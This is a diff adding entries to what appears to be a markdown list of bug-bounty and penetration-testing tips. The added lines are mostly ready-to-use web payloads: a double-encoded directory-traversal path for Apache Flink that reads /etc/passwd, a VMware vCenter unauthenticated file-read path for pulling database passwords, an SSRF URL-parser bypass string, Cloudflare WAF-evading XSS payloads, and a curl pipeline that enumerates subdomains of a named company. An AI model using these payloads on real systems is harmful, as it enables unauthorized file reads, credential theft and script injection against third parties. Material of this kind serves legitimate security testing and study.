@@ -212,5 +212,37 @@ language:python ssh2_auth_password
 **Source:-** 
 ***https://orwaatyat.medium.com/your-full-map-to-github-recon-and-leaks-exposure-860c37ca2c82***
 
+## Apache Flink new CVE Dir Traversal
+```text
+/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+```
+
+## Subdomain Takeover POC by [0xpatrik](https://twitter.com/0xpatrik)
+- ***https://0xpatrik.com/takeover-proofs/***
+
+## Unauthenticated Arbitrary File Read vulnerability in VMware vCenter before version 6.5u1
+
+PoC for extracting passwords from http://vcdb.properties file - /eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\http://vcdb.properties
+
+**Source:**https://twitter.com/payloadartist/status/1345760740465000448?s=20
+
+## Subdomain Enumeration
+```sh
+curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
+```
+ ***Note: for enumerating more target change att.com to your target domain***
+
+## SSRF Bypass
+```text
+http://google.com:80\\@yahoo.com/
+```
+which will send request to `yahoo` instead of `google`
+
+## Cloudflare xss bypass payloads by @spyerror
+```js
+<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+<svg%0Aonauxclick=0;[1].some(confirm)//
+```
+---
 
 
